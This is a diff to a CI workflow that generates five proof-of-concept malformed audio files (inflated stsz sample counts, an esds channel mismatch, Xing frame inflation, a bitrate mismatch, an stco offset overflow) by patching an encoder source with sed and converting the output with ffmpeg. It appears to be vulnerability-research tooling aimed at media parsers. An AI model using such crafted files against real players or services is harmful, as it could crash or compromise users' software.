@@ -73,13 +73,13 @@ jobs:
           # PoC 1: Inflated Sample Count in stsz
           cp encodeme.mm encodeme_poc1.mm
           sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/8192/' encodeme_poc1.mm
-          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
           
           # PoC 2: esds Channel Configuration Mismatch
           cp encodeme.mm encodeme_poc2.mm
           sed -i '' '/mChannelsPerFrame = channelNum/ s/channelNum/8/' encodeme_poc2.mm
           sed -i '' '/mNumberChannels = channelNum/ s/channelNum/1/' encodeme_poc2.mm
-          sed -i '' '/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/ s/0x3/0x8/' encodeme_poc2.mm
+          sed -i '' '/kAudioChannelLayoutTag_Stereo/ s/Stereo/HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
           
           # PoC 3: Xing Header Frame Count Inflation
           cp encodeme.mm encodeme_poc3.mm
@@ -87,12 +87,12 @@ jobs:
           
           # PoC 4: Frame Header Bitrate Mismatch
           cp encodeme.mm encodeme_poc4.mm
-          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
           
           # PoC 5: stco Offset Overflow
           cp encodeme.mm encodeme_poc5.mm
           sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/4096/' encodeme_poc5.mm
-          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/100/' encodeme_poc5.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/100/' encodeme_poc5.mm
           
           ls -l encodeme_poc*.mm
           echo "PoC source files created at $(date)"
@@ -128,8 +128,13 @@ jobs:
             ./encodeme_poc$poc
             if [ $? -eq 0 ]; then
               echo "encodeme_poc$poc executed successfully"
-              mv output_*.m4a poc${poc}.m4a || echo "No M4A file found, checking directory"
-              ls -l poc${poc}.m4a 2>/dev/null || ls -l
+              if ls output_*.m4a >/dev/null 2>&1; then
+                mv output_*.m4a poc${poc}.m4a
+                ls -l poc${poc}.m4a
+              else
+                echo "No M4A file generated for poc$poc"
+                exit 1
+              fi
             else
               echo "encodeme_poc$poc execution failed"
               exit 1
@@ -146,7 +151,7 @@ jobs:
             if [ -f poc${poc}.m4a ]; then
               if [ $poc -eq 3 ]; then
                 echo "Adding Xing metadata for PoC 3"
-                ffmpeg -i poc3.m4a -c:a mp3 -b:a 128k -ac 1 -metadata:s:v:0 frames=20000 poc3.mp3
+                ffmpeg -i poc3.m4a -c:a mp3 -b:a 128k -ac 1 -metadata frames=20000 poc3.mp3
               elif [ $poc -eq 4 ]; then
                 echo "Setting high bitrate for PoC 4"
                 ffmpeg -i poc4.m4a -c:a mp3 -b:a 320k -ac 1 poc4.mp3
